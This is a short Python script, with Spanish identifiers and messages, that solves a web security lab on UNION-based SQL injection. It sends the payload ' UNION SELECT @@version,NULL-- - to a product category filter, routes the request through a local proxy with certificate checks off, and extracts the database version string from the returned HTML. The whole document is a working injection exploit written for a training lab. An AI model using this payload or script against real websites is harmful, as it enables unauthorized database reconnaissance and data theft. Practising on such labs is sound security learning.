# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft 
# PRACTITIONER

# This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
# To solve the lab, display the database version string.
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxyjp = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
ParametroVulnerable = "filter?category="
Payload = "' UNION SELECT @@version,NULL-- -"

def Sqli_Lab_05(Url):
    SolicitudWeb = requests.get(Url + ParametroVulnerable + Payload, verify=False, proxies=proxyjp )
    RespuestaServidor = SolicitudWeb.text
    if "<th>" in RespuestaServidor:
        print("[+] Se encontro la version de la bd sqlserver")
        parseado = BeautifulSoup(RespuestaServidor, 'html.parser')
        version = parseado.find(string=re.compile('.*0ubuntu0.*'))
        print("[+] La version de sql server es: " + version)
    else:
        print("[-] No se pudo obtener la versión de sql server")      

if __name__ == "__main__":
    try:
        Url = sys.argv[1].strip() #aqui obtiene la url introducida por pantalla
        print("[+] Obteniendo la versión de sql server...")
        print(f"Payload: {Payload}")
        Sqli_Lab_05(Url)
    except IndexError:
        print("[-] Uso: %s <url>" % sys.argv[0])
        print("[-] Ejemplo: %s <https://paginaequis.com>" % sys.argv[0])
        sys.exit(-1)